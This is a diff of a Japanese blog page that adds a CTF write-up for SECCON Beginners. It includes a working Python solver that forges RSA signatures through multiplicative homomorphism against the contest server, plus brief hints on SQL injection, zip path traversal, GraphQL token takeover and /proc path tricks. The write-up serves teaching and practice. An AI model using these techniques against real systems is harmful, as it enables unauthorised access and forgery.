+            val <span style="color:#f92672">=</span> stack<span style="color:#f92672">.</span>pop()
+            <span style="color:#66d9ef">if</span> val <span style="color:#f92672">==</span> <span style="color:#ae81ff">1337</span>:
+                sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(flag <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+        <span style="color:#66d9ef">else</span>:
+            stack<span style="color:#f92672">.</span>append(int(c))
+
+    sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;Answer: {}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(int(stack<span style="color:#f92672">.</span>pop())))
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+    sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;N: {}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(N))
+    <span style="color:#66d9ef">while</span> True:
+        <span style="color:#66d9ef">try</span>:
+            command <span style="color:#f92672">=</span> menu()
+            <span style="color:#66d9ef">if</span> command <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
+                cmd_sign()
+            <span style="color:#66d9ef">if</span> command <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>:
+                cmd_exec()
+            <span style="color:#66d9ef">elif</span> command <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span>:
+                <span style="color:#66d9ef">break</span>
+        <span style="color:#66d9ef">except</span>:
+            sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;Error</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+            <span style="color:#66d9ef">break</span>
+
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+    signal<span style="color:#f92672">.</span>alarm(<span style="color:#ae81ff">60</span>)
+    main()
+</code></pre></div><p><code>F</code>または<code>1337</code>を含まないならば、任意の文字列に署名してくれる。そしてスタック署名されたスタックマシンの命令列を実行し、狙ったところに入れる（そのために<code>F</code>や<code>1337</code>が必要）ことができればフラグが入手できる。
+RSAの準同型性を利用した。端的にいうと、いまRSAのパラメーターとして\(N, e, d\)と、任意の平文\(m_1, m_2\)があるとして、RSAは次がなりたつ。</p>
+<p>$$
+\text{Sign}_{d, N}(m_1 \times m_2) \equiv \text{Sign}_{d, N}(m_1) \times \text{Sign}_{d, N}(m_2) \bmod N
+$$</p>
+<p>よって次のようなプランでアタックする。</p>
+<ol>
+<li>\(2\)に署名させる</li>
+<li>\(\frac{\mathtt{1337,F}}{2}\)した値に署名させる
+<ul>
+<li>偶然<code>1337,F</code>の数値表現は\(2\)で割り切ることができた</li>
+</ul>
+</li>
+<li>上記2つの署名をかけ算して\(N\)で割った余りをとる
+<ul>
+<li>これが<code>1337,F</code>の署名となっている</li>
+</ul>
+</li>
+<li><code>1337,F</code>を実行し、署名として（3）で得られたものを入れる</li>
+</ol>
+<p>これをやるのが下記のプログラムである。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> numpy <span style="color:#f92672">as</span> np
+<span style="color:#f92672">import</span> re
+<span style="color:#f92672">import</span> socket
+<span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#34;rsacalc.quals.beginners.seccon.jp&#34;</span>, <span style="color:#ae81ff">10001</span>))
+data <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
+data_n <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#39;N: (\d+)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, data)<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>)
+
+N <span style="color:#f92672">=</span> int(data_n)
+
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;N: &#34;</span> <span style="color:#f92672">+</span> str(N))
+
+command <span style="color:#f92672">=</span> bytes_to_long(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1337,F&#39;</span>)
+half_command <span style="color:#f92672">=</span> int(command <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>)
+
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;command: &#34;</span> <span style="color:#f92672">+</span> str(command))
+
+<span style="color:#75715e"># Get `2` signature</span>
+s<span style="color:#f92672">.</span>sendall(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+<span style="color:#66d9ef">print</span>(s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+
+s<span style="color:#f92672">.</span>sendall(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\02\n</span><span style="color:#e6db74">&#39;</span>)
+
+signature_2 <span style="color:#f92672">=</span> int(
+    re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#39;Signature: ([\da-f]+)&#39;</span>, s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>),
+    <span style="color:#ae81ff">16</span>
+)
+
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;signature_2: &#34;</span> <span style="color:#f92672">+</span> str(signature_2))
+
+<span style="color:#75715e"># Get `half_command` signature</span>
+s<span style="color:#f92672">.</span>sendall(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+<span style="color:#66d9ef">print</span>(s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+
+s<span style="color:#f92672">.</span>sendall(
+    half_command<span style="color:#f92672">.</span>to_bytes((half_command<span style="color:#f92672">.</span>bit_length() <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span>) , byteorder<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>, signed<span style="color:#f92672">=</span>False) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
+)
+
+signature_half_command <span style="color:#f92672">=</span> int(
+    re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#39;Signature: ([\da-f]+)&#39;</span>, s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>),
+    <span style="color:#ae81ff">16</span>
+)
+
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;signature half command: &#34;</span> <span style="color:#f92672">+</span> str(signature_half_command))
+
+<span style="color:#75715e"># Calculate signature</span>
+signature_command <span style="color:#f92672">=</span> signature_half_command <span style="color:#f92672">*</span> signature_2 <span style="color:#f92672">%</span> N
+
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;GOOOOOOOOOOOOOOOOOO&#34;</span>)
+
+<span style="color:#75715e"># Execute command</span>
+s<span style="color:#f92672">.</span>sendall(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+<span style="color:#66d9ef">print</span>(s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+s<span style="color:#f92672">.</span>sendall(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1337,F</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+<span style="color:#66d9ef">print</span>(s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+sig <span style="color:#f92672">=</span> (format(signature_command, <span style="color:#e6db74">&#39;x&#39;</span>))<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;ascii&#34;</span>)
+
+s<span style="color:#f92672">.</span>sendall(sig <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#39;</span>)
+
+<span style="color:#66d9ef">print</span>(s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">2024</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</code></pre></div><h2 id="web">Web</h2>
+<h3 id="spy">Spy</h3>
+<p>ユーザの有無でサーバの応答時間が変わるので、全ユーザー試して列挙。</p>
+<h3 id="tweetstore">Tweetstore</h3>
+<p>SQLインジェクションでユーザ情報を表示する。</p>
+<h3 id="unzip">unzip</h3>
+<p>解凍後に../../../../../../../../../flag.txtを展開するzipをアップロード。</p>
+<h3 id="profiler">profiler</h3>
+<p>Burp Suiteで通信を覗くと、APIでGraphQLが使われていることがわかる。
+AltairというChrome拡張機能でGraphQLのクエリを送ることができる。
+利用できそうなAPIを探すと、他の人のprofileが覗けそうなsomeoneとトークンをアップデートできそうなupdateTokenが見つかる。
+someoneでuid:adminを指定してリクエストすると、adminのTokenが参照できる。
+ここで手に入れた値をupdateTokenで指定すると、自分のTokenがadminと同じトークンに変更できる。
+この状態でflagページにアクセスすると、flagが表示される。</p>
+<h2 id="reversing">Reversing</h2>
+<h3 id="mask">mask</h3>
+<p>Ghidraに食わせると、flagの各文字を&amp; 0x75した文字列と&amp; 0xebした文字列が見つかるので、これらの論理和を計算。</p>
+<h3 id="yakisoba">yakisoba</h3>
+<p>Ghidraに食わせると、flagの各文字を判定する関数が見つかるので、読む。</p>
+<h3 id="ghost">ghost</h3>
+<p>実装が与えられているので、総当たり。</p>
+<h2 id="misc">Misc</h2>
+<h3 id="welcome">Welcome</h3>
+<p>Discordを見る。</p>
+<h3 id="emoemoencode">emoemoencode</h3>
+<p>絵文字の文字コードの下2桁をasciiにする。</p>
+<h3 id="readme">readme</h3>
+<p>/proc/self/environでpwdが/home/ctf/serverとわかるので、/proc/self/cwd/../flagを渡し、相対パスでアクセス。</p>
+
+                    </div>
+                </section>
+                
                 <h1 class="content-subhead">29 Dec 2019, 21:54</h1>
                 <section class="post">
                     <header class="post-header">
@@ -589,51 +1191,12 @@ Linuxカーネルはとりあえず動くものをビルドしたので、より
                     </div>
                 </section>
                 
-                <h1 class="content-subhead">02 Nov 2016, 22:55</h1>
-                <section class="post">
-                    <header class="post-header">
-
-                        <a href="//blog.urandom.team/post/c90-digital-and-c91/" class="post-title">urandom vol.2電子版公開のお知らせとC91告知</a>
-
-                        <p class="post-meta">
-                            
-                                By <strong class="post-author">mayth</strong>
-                            
-                            
-                                under 
-                                
-                                    <a class="post-category post-category-Publication" href='//blog.urandom.team/categories/Publication'>Publication</a>
-                                
-                            
-                        </p>
-                    </header>
-
-                    <div class="post-description">
-                        <h1 id="urandom-vol2電子版">urandom vol.2電子版</h1>
-<p>大変長らくお待たせしました。urandom vol.2の電子版を公開しました。</p>
-<p>urandom vol.2電子版は <strong>128円</strong> での販売となります。内容は物理書籍版とほぼ同じです（どこが違うか探してみよう！　特に景品はないです）。</p>
-<p>販売ページは<a href="https://gumroad.com/l/zjTOY">こちら（Gumroad）</a>です。決済にはクレジットカードかPayPalが使えます。</p>
-<h2 id="物理書籍版購入者の方へ">物理書籍版購入者の方へ</h2>
-<p>購入ページに&quot;Offer code&quot;という欄がありますので、そちらに物理書籍挟み込みの紙に記載されたコードを入力してください。</p>
-<ul>
-<li>コードを使用する場合、クレジットカード情報は不要です。正しいコードを入力すると入力欄が非表示になります。</li>
-<li>同一コードは10回まで使用可能です。ダウンロードしたデータを紛失した際は同一コードを入力してください。</li>
-</ul>
-<h1 id="urandom-vol3">urandom vol.3</h1>
-<p>続けて冬のお知らせです。無事に冬コミ（C91）に当選しました。スペースは <strong>土曜日 東R-12b</strong> です（<a href="https://webcatalog.circle.ms/Circle/13006119">Webカタログはこちら</a>）。</p>
-<p>これまでだと「だいたいこういう内容になる予定ですよ」というリストくらいは出せていたのですが、今回は現時点で何も決まっておりません。
-が、コンピュータセキュリティ的な本であるところからは変わりないと思います。内容が決まり次第随時告知しますので、今しばらくお待ちください。</p>
-<p>それでは、今年も大晦日にお会いしましょう。</p>
-
-                    </div>
-                </section>
-                
             </div>
             
 <div class="pagination">
   <nav role="pagination" class="post-list-pagination">
       
-    <span class="post-list-pagination-item post-list-pagination-item-current">Page 1 of 2</span>
+    <span class="post-list-pagination-item post-list-pagination-item-current">Page 1 of 3</span>
     
       <a href="/post/page/2/" class="post-list-pagination-item pure-button post-list-pagination-item-next">
         Older&nbsp;<i class="fa fa-angle-double-right"></i>
